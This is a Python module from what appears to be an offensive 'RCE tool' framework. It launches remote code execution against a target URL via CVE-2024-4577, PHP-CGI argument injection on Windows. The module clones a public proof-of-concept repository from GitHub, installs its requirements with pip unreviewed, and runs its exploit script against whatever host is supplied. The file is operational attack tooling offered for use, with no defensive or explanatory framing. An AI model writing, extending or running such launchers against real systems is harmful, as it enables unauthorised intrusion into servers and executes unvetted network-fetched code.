"""CVE-2024-4577 — PHP-CGI argument injection (Windows).
Обёртка над Chocapikk/CVE-2024-4577.
Требования: git, python3, pip.
"""
import sys, subprocess
from pathlib import Path
from framework import Module, C, require

REPO = "https://github.com/Chocapikk/CVE-2024-4577.git"
WORK = Path.home() / ".rce-tool" / "cve-2024-4577"


class CVE20244577(Module):
    name = "cve_2024_4577"
    description = "PHP-CGI argument injection RCE (Windows, Chocapikk PoC)"
    author = "you"

    options = {
        "TARGET": {"value": None, "required": True, "description": "Target URL, e.g. http://10.10.10.5"},
    }

    def _ensure(self) -> bool:
        if (WORK / "exploit.py").exists():
            return True
        WORK.parent.mkdir(parents=True, exist_ok=True)
        print(f"{C.Y}[] Cloning {REPO}{C.END}")
        r = subprocess.run(["git", "clone", "--depth", "1", REPO, str(WORK)],
                           capture_output=True, text=True)
        if r.returncode != 0:
            print(f"{C.R}[!] git clone failed: {r.stderr}{C.END}")
            return False
        req = WORK / "requirements.txt"
        if req.exists():
            print(f"{C.Y}[] Installing requirements...{C.END}")
            subprocess.run([sys.executable, "-m", "pip", "install", "-q", "-r", str(req)],
                           check=False)
        else:
            print(f"{C.DIM}[*] No requirements.txt — skipping.{C.END}")
        return True

    def run(self):
        if require("git"):
            print(f"{C.R}[!] git not found.{C.END}")
            return
        if not self._ensure():
            return
        target = self.get("TARGET").rstrip("/")
        cmd = [sys.executable, "exploit.py", "--url", target]
        print(f"{C.Y}[*] Running: {' '.join(cmd)}{C.END}")
        subprocess.run(cmd, cwd=str(WORK))
